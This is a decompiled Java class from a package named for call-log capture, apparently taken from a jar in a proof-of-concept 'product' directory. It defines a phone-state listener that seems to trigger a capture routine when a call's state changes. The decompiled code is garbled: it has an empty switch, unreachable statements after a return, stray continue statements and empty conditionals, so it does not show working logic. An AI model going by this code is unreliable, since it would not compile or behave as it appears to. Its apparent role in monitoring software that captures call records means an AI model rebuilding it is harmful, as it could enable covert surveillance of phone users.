package com.vvt.capture.calllog.b;

import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.vvt.base.capture.i;

class e
  extends PhoneStateListener
{
  private e(b paramb) {}
  
  public void onCallStateChanged(int paramInt, String paramString)
  {
    super.onCallStateChanged(paramInt, paramString);
    switch (paramInt)
    {
    }
    for (;;)
    {
      Object localObject = b.c(this.a);
      e locale = b.b(this.a);
      ((TelephonyManager)localObject).listen(locale, 0);
      return;
      boolean bool = b.a();
      if (bool) {}
      localObject = b.f(this.a);
      if (localObject != null)
      {
        bool = b.a();
        if (bool) {}
        localObject = b.f(this.a);
        ((i)localObject).a();
        continue;
        bool = b.a();
        if (bool)
        {
          continue;
          bool = b.a();
          if (bool) {}
          bool = b.a();
          if (!bool) {}
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/removeFromPath/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */